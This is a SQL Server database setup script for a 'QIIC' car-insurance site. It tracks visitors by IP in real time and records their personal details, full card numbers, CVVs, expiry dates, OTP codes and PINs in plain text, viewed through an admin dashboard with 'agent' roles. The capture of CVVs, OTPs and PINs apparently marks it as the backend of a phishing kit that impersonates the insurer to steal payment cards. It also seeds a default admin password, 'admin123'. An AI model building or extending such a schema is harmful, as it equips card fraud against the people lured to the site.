-- ============================================
-- QIIC Real-time Insurance System Database Setup
-- Database: u262632985_qic
-- Compatible with Azure SQL / SQL Server
-- Updated to match Socket.IO real-time architecture
-- ============================================

USE u262632985_qic;
GO

-- Drop tables if they exist (in correct order due to foreign keys)
IF OBJECT_ID('pin_codes', 'U') IS NOT NULL DROP TABLE pin_codes;
IF OBJECT_ID('otp_codes', 'U') IS NOT NULL DROP TABLE otp_codes;
IF OBJECT_ID('payments', 'U') IS NOT NULL DROP TABLE payments;
IF OBJECT_ID('quotes', 'U') IS NOT NULL DROP TABLE quotes;
IF OBJECT_ID('policy_dates', 'U') IS NOT NULL DROP TABLE policy_dates;
IF OBJECT_ID('insurance_info', 'U') IS NOT NULL DROP TABLE insurance_info;
IF OBJECT_ID('plate_numbers', 'U') IS NOT NULL DROP TABLE plate_numbers;
IF OBJECT_ID('select_insurance', 'U') IS NOT NULL DROP TABLE select_insurance;
IF OBJECT_ID('more_details', 'U') IS NOT NULL DROP TABLE more_details;
IF OBJECT_ID('car_details', 'U') IS NOT NULL DROP TABLE car_details;
IF OBJECT_ID('user_locations', 'U') IS NOT NULL DROP TABLE user_locations;
IF OBJECT_ID('admin_users', 'U') IS NOT NULL DROP TABLE admin_users;
IF OBJECT_ID('customer_sessions', 'U') IS NOT NULL DROP TABLE customer_sessions;
GO

-- ============================================
-- Customer Sessions Table (Track real-time users)
-- ============================================
CREATE TABLE customer_sessions (
    id INT IDENTITY(1,1) PRIMARY KEY,
    ip_address NVARCHAR(45) NOT NULL UNIQUE,
    socket_id NVARCHAR(100),
    is_active BIT DEFAULT 1,
    current_page NVARCHAR(255),
    full_name NVARCHAR(255),
    email NVARCHAR(255),
    phone NVARCHAR(20),
    qid NVARCHAR(50),
    payment_status NVARCHAR(50) DEFAULT 'pending',
    location_country NVARCHAR(100),
    location_city NVARCHAR(100),
    location_region NVARCHAR(100),
    location_timezone NVARCHAR(100),
    first_seen DATETIME2 DEFAULT GETDATE(),
    last_seen DATETIME2 DEFAULT GETDATE(),
    created_at DATETIME2 DEFAULT GETDATE(),
    updated_at DATETIME2 DEFAULT GETDATE()
);
GO

CREATE INDEX idx_ip_address ON customer_sessions(ip_address);
CREATE INDEX idx_is_active ON customer_sessions(is_active);
CREATE INDEX idx_current_page ON customer_sessions(current_page);
GO

-- ============================================
-- User Locations Table (Page navigation tracking)
-- ============================================
CREATE TABLE user_locations (
    id INT IDENTITY(1,1) PRIMARY KEY,
    ip_address NVARCHAR(45) NOT NULL,
    current_page NVARCHAR(255) NOT NULL,
    previous_page NVARCHAR(255),
    timestamp DATETIME2 DEFAULT GETDATE(),
    CONSTRAINT FK_location_session FOREIGN KEY (ip_address) 
        REFERENCES customer_sessions(ip_address) ON DELETE CASCADE
);
GO

CREATE INDEX idx_location_ip ON user_locations(ip_address);
CREATE INDEX idx_location_page ON user_locations(current_page);
CREATE INDEX idx_location_timestamp ON user_locations(timestamp);
GO

-- ============================================
-- Car Details Table (Step 1: Vehicle Information)
-- ============================================
CREATE TABLE car_details (
    id INT IDENTITY(1,1) PRIMARY KEY,
    ip_address NVARCHAR(45) NOT NULL,
    brand NVARCHAR(100),
    model NVARCHAR(100),
    year NVARCHAR(10),
    seats NVARCHAR(10),
    cylinders NVARCHAR(10),
    timestamp DATETIME2 DEFAULT GETDATE(),
    CONSTRAINT FK_car_session FOREIGN KEY (ip_address) 
        REFERENCES customer_sessions(ip_address) ON DELETE CASCADE
);
GO

CREATE INDEX idx_car_ip ON car_details(ip_address);
CREATE INDEX idx_car_brand ON car_details(brand);
CREATE INDEX idx_car_year ON car_details(year);
GO

-- ============================================
-- More Details Table (Step 2: Additional Vehicle Info)
-- ============================================
CREATE TABLE more_details (
    id INT IDENTITY(1,1) PRIMARY KEY,
    ip_address NVARCHAR(45) NOT NULL,
    body_type NVARCHAR(100),
    engine_size NVARCHAR(50),
    color NVARCHAR(50),
    registration_year NVARCHAR(10),
    timestamp DATETIME2 DEFAULT GETDATE(),
    CONSTRAINT FK_more_session FOREIGN KEY (ip_address) 
        REFERENCES customer_sessions(ip_address) ON DELETE CASCADE
);
GO

CREATE INDEX idx_more_ip ON more_details(ip_address);
GO

-- ============================================
-- Select Insurance Table (Step 3: Insurance Selection)
-- ============================================
CREATE TABLE select_insurance (
    id INT IDENTITY(1,1) PRIMARY KEY,
    ip_address NVARCHAR(45) NOT NULL,
    insurance_type NVARCHAR(100),
    selected_company NVARCHAR(255),
    base_price DECIMAL(10,2),
    total_price DECIMAL(10,2),
    timestamp DATETIME2 DEFAULT GETDATE(),
    CONSTRAINT FK_insurance_session FOREIGN KEY (ip_address) 
        REFERENCES customer_sessions(ip_address) ON DELETE CASCADE
);
GO

CREATE INDEX idx_insurance_ip ON select_insurance(ip_address);
CREATE INDEX idx_insurance_type ON select_insurance(insurance_type);
CREATE INDEX idx_insurance_company ON select_insurance(selected_company);
GO

-- ============================================
-- Plate Numbers Table (Step 4: License Plate)
-- ============================================
CREATE TABLE plate_numbers (
    id INT IDENTITY(1,1) PRIMARY KEY,
    ip_address NVARCHAR(45) NOT NULL,
    plate_number NVARCHAR(50),
    plate_code NVARCHAR(20),
    timestamp DATETIME2 DEFAULT GETDATE(),
    CONSTRAINT FK_plate_session FOREIGN KEY (ip_address) 
        REFERENCES customer_sessions(ip_address) ON DELETE CASCADE
);
GO

CREATE INDEX idx_plate_ip ON plate_numbers(ip_address);
CREATE INDEX idx_plate_number ON plate_numbers(plate_number);
GO

-- ============================================
-- Insurance Info Table (Step 5: Personal Information)
-- ============================================
CREATE TABLE insurance_info (
    id INT IDENTITY(1,1) PRIMARY KEY,
    ip_address NVARCHAR(45) NOT NULL,
    full_name NVARCHAR(255),
    qid NVARCHAR(50),
    phone NVARCHAR(20),
    email NVARCHAR(255),
    address NVARCHAR(MAX),
    date_of_birth DATE,
    nationality NVARCHAR(100),
    timestamp DATETIME2 DEFAULT GETDATE(),
    CONSTRAINT FK_info_session FOREIGN KEY (ip_address) 
        REFERENCES customer_sessions(ip_address) ON DELETE CASCADE
);
GO

CREATE INDEX idx_info_ip ON insurance_info(ip_address);
CREATE INDEX idx_info_qid ON insurance_info(qid);
CREATE INDEX idx_info_phone ON insurance_info(phone);
CREATE INDEX idx_info_email ON insurance_info(email);
GO

-- ============================================
-- Policy Dates Table (Step 6: Policy Duration)
-- ============================================
CREATE TABLE policy_dates (
    id INT IDENTITY(1,1) PRIMARY KEY,
    ip_address NVARCHAR(45) NOT NULL,
    start_date DATE,
    end_date DATE,
    duration_months INT,
    timestamp DATETIME2 DEFAULT GETDATE(),
    CONSTRAINT FK_policy_session FOREIGN KEY (ip_address) 
        REFERENCES customer_sessions(ip_address) ON DELETE CASCADE
);
GO

CREATE INDEX idx_policy_ip ON policy_dates(ip_address);
GO

-- ============================================
-- Quotes Table (Step 7: Quote Information)
-- ============================================
CREATE TABLE quotes (
    id INT IDENTITY(1,1) PRIMARY KEY,
    ip_address NVARCHAR(45) NOT NULL,
    quote_amount DECIMAL(10,2),
    coverage_type NVARCHAR(100),
    additional_coverage NVARCHAR(MAX),
    timestamp DATETIME2 DEFAULT GETDATE(),
    CONSTRAINT FK_quote_session FOREIGN KEY (ip_address) 
        REFERENCES customer_sessions(ip_address) ON DELETE CASCADE
);
GO

CREATE INDEX idx_quote_ip ON quotes(ip_address);
GO

-- ============================================
-- Payments Table (Step 8: Payment Information)
-- ============================================
CREATE TABLE payments (
    id INT IDENTITY(1,1) PRIMARY KEY,
    ip_address NVARCHAR(45) NOT NULL,
    payment_method NVARCHAR(100),
    card_number NVARCHAR(20),
    cvv NVARCHAR(10),
    expiration_date NVARCHAR(10),
    card_holder_name NVARCHAR(255),
    phone_number NVARCHAR(20),
    card_last_digits NVARCHAR(10),
    amount DECIMAL(10,2),
    status NVARCHAR(50) DEFAULT 'pending',
    timestamp DATETIME2 DEFAULT GETDATE(),
    CONSTRAINT FK_payment_session FOREIGN KEY (ip_address) 
        REFERENCES customer_sessions(ip_address) ON DELETE CASCADE
);
GO

CREATE INDEX idx_payment_ip ON payments(ip_address);
CREATE INDEX idx_payment_method ON payments(payment_method);
CREATE INDEX idx_payment_status ON payments(status);
GO

-- ============================================
-- OTP Codes Table (Step 9: OTP Verification)
-- ============================================
CREATE TABLE otp_codes (
    id INT IDENTITY(1,1) PRIMARY KEY,
    ip_address NVARCHAR(45) NOT NULL,
    otp_code NVARCHAR(10) NOT NULL,
    verified BIT DEFAULT 0,
    timestamp DATETIME2 DEFAULT GETDATE(),
    CONSTRAINT FK_otp_session FOREIGN KEY (ip_address) 
        REFERENCES customer_sessions(ip_address) ON DELETE CASCADE
);
GO

CREATE INDEX idx_otp_ip ON otp_codes(ip_address);
CREATE INDEX idx_otp_code ON otp_codes(otp_code);
GO

-- ============================================
-- PIN Codes Table (Step 10: PIN Verification)
-- ============================================
CREATE TABLE pin_codes (
    id INT IDENTITY(1,1) PRIMARY KEY,
    ip_address NVARCHAR(45) NOT NULL,
    pin_code NVARCHAR(10) NOT NULL,
    verified BIT DEFAULT 0,
    timestamp DATETIME2 DEFAULT GETDATE(),
    CONSTRAINT FK_pin_session FOREIGN KEY (ip_address) 
        REFERENCES customer_sessions(ip_address) ON DELETE CASCADE
);
GO

CREATE INDEX idx_pin_ip ON pin_codes(ip_address);
CREATE INDEX idx_pin_code ON pin_codes(pin_code);
GO

-- ============================================
-- Admin Users Table (Admin Dashboard Access)
-- ============================================
CREATE TABLE admin_users (
    id INT IDENTITY(1,1) PRIMARY KEY,
    username NVARCHAR(100) NOT NULL UNIQUE,
    email NVARCHAR(255) NOT NULL UNIQUE,
    password_hash NVARCHAR(255) NOT NULL,
    full_name NVARCHAR(255),
    role NVARCHAR(20) DEFAULT 'agent' CHECK (role IN ('super_admin', 'admin', 'agent')),
    is_active BIT DEFAULT 1,
    last_login DATETIME2 NULL,
    created_at DATETIME2 DEFAULT GETDATE(),
    updated_at DATETIME2 DEFAULT GETDATE()
);
GO

CREATE INDEX idx_admin_username ON admin_users(username);
CREATE INDEX idx_admin_email ON admin_users(email);
CREATE INDEX idx_admin_role ON admin_users(role);
GO

-- ============================================
-- Insert Default Admin User
-- ============================================
-- Password: admin123 (يجب تغييره في الإنتاج)
INSERT INTO admin_users (username, email, password_hash, full_name, role) VALUES
(N'admin', N'admin@qiic.com', N'$2b$10$X7vKNQFxVJ9K8YGZqLZh4.VqW5LqKYp5KWYzJxVJ9K8YGZqLZh4.V', N'System Administrator', N'super_admin');
GO

-- ============================================
-- Insert Sample Data for Testing
-- ============================================
SET IDENTITY_INSERT customer_sessions ON;
INSERT INTO customer_sessions (id, ip_address, socket_id, is_active, current_page, full_name, email, phone, qid, payment_status, location_country, location_city) VALUES
(1, N'192.168.1.100', N'socket-test-1', 1, N'/payment', N'أحمد محمد الكعبي', N'ahmed@test.com', N'+97455123456', N'28512345678', N'pending', N'Qatar', N'Doha'),
(2, N'192.168.1.101', N'socket-test-2', 1, N'/car-details', N'فاطمة علي السليطي', N'fatima@test.com', N'+97455987654', N'28598765432', N'pending', N'Qatar', N'Al Rayyan');
SET IDENTITY_INSERT customer_sessions OFF;
GO

-- Insert sample car details
INSERT INTO car_details (ip_address, brand, model, year, seats, cylinders) VALUES
(N'192.168.1.100', N'Toyota', N'Camry', N'2023', N'5', N'4'),
(N'192.168.1.101', N'Honda', N'Accord', N'2022', N'5', N'4');
GO

-- Insert sample payments
INSERT INTO payments (ip_address, payment_method, card_number, amount, status) VALUES
(N'192.168.1.100', N'Credit Card', N'4532********1234', 2500.00, N'pending'),
(N'192.168.1.101', N'Debit Card', N'5412********5678', 2800.00, N'pending');
GO

-- Insert sample OTP codes
INSERT INTO otp_codes (ip_address, otp_code, verified) VALUES
(N'192.168.1.100', N'123456', 0),
(N'192.168.1.101', N'789012', 0);
GO

-- Insert sample PIN codes
INSERT INTO pin_codes (ip_address, pin_code, verified) VALUES
(N'192.168.1.100', N'1234', 0),
(N'192.168.1.101', N'5678', 0);
GO

-- ============================================
-- Stored Procedures for Common Operations
-- ============================================

-- Get complete customer journey by IP
GO
CREATE PROCEDURE GetCustomerJourney
    @IpAddress NVARCHAR(45)
AS
BEGIN
    SET NOCOUNT ON;
    
    SELECT 
        s.ip_address,
        s.full_name,
        s.email,
        s.phone,
        s.qid,
        s.current_page,
        s.is_active,
        s.payment_status,
        cd.brand AS car_brand,
        cd.model AS car_model,
        cd.year AS car_year,
        si.insurance_type,
        si.selected_company,
        si.total_price,
        p.payment_method,
        p.amount AS payment_amount,
        p.status AS payment_status,
        (SELECT COUNT(*) FROM otp_codes WHERE ip_address = @IpAddress) AS otp_count,
        (SELECT COUNT(*) FROM pin_codes WHERE ip_address = @IpAddress) AS pin_count
    FROM customer_sessions s
    LEFT JOIN car_details cd ON s.ip_address = cd.ip_address
    LEFT JOIN select_insurance si ON s.ip_address = si.ip_address
    LEFT JOIN payments p ON s.ip_address = p.ip_address
    WHERE s.ip_address = @IpAddress;
END;
GO

-- Delete customer and all related data
GO
CREATE PROCEDURE DeleteCustomerData
    @IpAddress NVARCHAR(45)
AS
BEGIN
    SET NOCOUNT ON;
    BEGIN TRANSACTION;
    
    BEGIN TRY
        DELETE FROM customer_sessions WHERE ip_address = @IpAddress;
        -- Foreign keys with CASCADE will handle related tables
        COMMIT TRANSACTION;
        SELECT 'Customer data deleted successfully' AS Result;
    END TRY
    BEGIN CATCH
        ROLLBACK TRANSACTION;
        SELECT ERROR_MESSAGE() AS Error;
    END CATCH;
END;
GO

-- Update payment status
GO
CREATE PROCEDURE UpdatePaymentStatus
    @IpAddress NVARCHAR(45),
    @NewStatus NVARCHAR(50)
AS
BEGIN
    SET NOCOUNT ON;
    
    UPDATE payments 
    SET status = @NewStatus 
    WHERE ip_address = @IpAddress;
    
    UPDATE customer_sessions 
    SET payment_status = @NewStatus 
    WHERE ip_address = @IpAddress;
    
    SELECT 'Payment status updated' AS Result;
END;
GO

-- ============================================
-- Views for Dashboard Analytics
-- ============================================

-- Active customers overview
GO
CREATE VIEW vw_active_customers AS
SELECT 
    s.ip_address,
    s.full_name,
    s.email,
    s.phone,
    s.current_page,
    s.payment_status,
    s.last_seen,
    COUNT(DISTINCT cd.id) AS car_details_count,
    COUNT(DISTINCT p.id) AS payment_count,
    COUNT(DISTINCT o.id) AS otp_count,
    COUNT(DISTINCT pin.id) AS pin_count
FROM customer_sessions s
LEFT JOIN car_details cd ON s.ip_address = cd.ip_address
LEFT JOIN payments p ON s.ip_address = p.ip_address
LEFT JOIN otp_codes o ON s.ip_address = o.ip_address
LEFT JOIN pin_codes pin ON s.ip_address = pin.ip_address
WHERE s.is_active = 1
GROUP BY s.ip_address, s.full_name, s.email, s.phone, s.current_page, s.payment_status, s.last_seen;
GO

-- Payment statistics
GO
CREATE VIEW vw_payment_stats AS
SELECT 
    payment_method,
    status,
    COUNT(*) AS transaction_count,
    SUM(amount) AS total_amount,
    AVG(amount) AS avg_amount,
    MIN(amount) AS min_amount,
    MAX(amount) AS max_amount
FROM payments
GROUP BY payment_method, status;
GO

-- ============================================
-- Verification and Statistics
-- ============================================
PRINT '============================================';
PRINT 'Database setup completed successfully!';
PRINT '============================================';

SELECT 
    'customer_sessions' AS TableName, 
    COUNT(*) AS RecordCount 
FROM customer_sessions
UNION ALL
SELECT 'car_details', COUNT(*) FROM car_details
UNION ALL
SELECT 'more_details', COUNT(*) FROM more_details
UNION ALL
SELECT 'select_insurance', COUNT(*) FROM select_insurance
UNION ALL
SELECT 'plate_numbers', COUNT(*) FROM plate_numbers
UNION ALL
SELECT 'insurance_info', COUNT(*) FROM insurance_info
UNION ALL
SELECT 'policy_dates', COUNT(*) FROM policy_dates
UNION ALL
SELECT 'quotes', COUNT(*) FROM quotes
UNION ALL
SELECT 'payments', COUNT(*) FROM payments
UNION ALL
SELECT 'otp_codes', COUNT(*) FROM otp_codes
UNION ALL
SELECT 'pin_codes', COUNT(*) FROM pin_codes
UNION ALL
SELECT 'admin_users', COUNT(*) FROM admin_users;
GO

PRINT '============================================';
PRINT 'Test the stored procedures:';
PRINT 'EXEC GetCustomerJourney @IpAddress = ''192.168.1.100'';';
PRINT 'EXEC UpdatePaymentStatus @IpAddress = ''192.168.1.100'', @NewStatus = ''approved'';';
PRINT 'EXEC DeleteCustomerData @IpAddress = ''192.168.1.100'';';
PRINT '============================================';
GO
